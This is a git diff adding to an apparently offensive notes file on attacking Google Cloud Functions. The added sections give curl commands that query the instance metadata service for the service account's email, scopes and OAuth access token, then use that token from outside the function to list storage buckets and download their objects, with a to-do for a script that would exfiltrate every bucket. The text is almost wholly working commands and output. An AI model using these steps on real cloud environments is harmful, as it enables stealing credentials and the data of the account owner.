@@ -102,9 +102,104 @@ X_GOOGLE_FUNCTION_VERSION=2
 NODE_ENV=production
 ```
 
-The supervisor service is definitely going to be a point of interest:
+The supervisor service is could be a point of interest?
 
 ```
 curl 169.254.8.129:8081
 404 page not found
+```
+
+## Metadata Endpoint
+
+[App Engine Metadata Service](
+https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadata#making_metadata_requests)
+
+Querying the service account for interesting bits of information:
+
+```
+curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
+
+<account-email>@developer.gserviceaccount.com
+
+```
+
+Querying for the default aliases:
+
+```
+curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/aliases
+
+default
+```
+
+Querying for the default service accounts for the execution role:
+
+```
+curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/
+
+aliases
+email
+identity
+scopes
+token
+```
+
+Querying the metadata service for the valid scopes:
+
+```
+curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
+
+
+https://mail.google.com/
+https://www.googleapis.com/auth/analytics
+https://www.googleapis.com/auth/calendar
+https://www.googleapis.com/auth/cloud-platform
+https://www.googleapis.com/auth/contacts
+https://www.googleapis.com/auth/drive
+https://www.googleapis.com/auth/presentations
+https://www.googleapis.com/auth/spreadsheets
+https://www.googleapis.com/auth/streetviewpublish
+https://www.googleapis.com/auth/urlshortener
+https://www.googleapis.com/auth/userinfo.email
+https://www.googleapis.com/auth/youtube
+
+```
+
+Querying the service account authentication token, which appears to be valid for 30 minutes.
+
+```
+curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+{"access_token":"ya29.c.ABC123","expires_in":1676,"token_type":"Bearer"}
+```
+
+## Token Pivoting
+
+At the time of this writing, I have not found a way to load up the OAuth access token and use it from the `gcloud` command line interface. This overall makes it harder to run commands against the account, but can still be done directly against the API using a proxy tool, Burp, or by using the SDK from a script (Python, Java, .NET, etc.).
+
+TODO: Write a bucket exhilaration script to do the following for us for all buckets and all items in the project.
+
+Set the *access_token* and project environment variables locally using the values obtained from the function execution environment.
+
+```bash
+export GOOGLE_ACCESS_TOKEN=<INSERT ACCESS TOKEN>
+export GOOGLE_PROJECT=<GOOGLE PROJECT>
+```
+
+List the buckets for the project and query the first bucket:
+
+```bash
+curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "https://storage.googleapis.com/storage/v1/b?project=$GOOGLE_PROJECT" | jq '.items[0].selfLink'
+```
+
+List the objects in the storage bucket
+
+```bash
+export GOOGLE_PROJECT_BUCKET=$(curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "https://storage.googleapis.com/storage/v1/b?project=$GOOGLE_PROJECT" | jq -r '.items[0].selfLink')
+curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "$GOOGLE_PROJECT_BUCKET/o"
+```
+
+Download the object from the bucket:
+
+```bash
+export GOOGLE_BUCKET_ITEM=$(curl -s -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "$GOOGLE_PROJECT_BUCKET/o" | jq -r '.items[0].selfLink')
+curl -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "$GOOGLE_BUCKET_ITEM?alt=media" --output ~/Downloads/img2.jpg
 ```
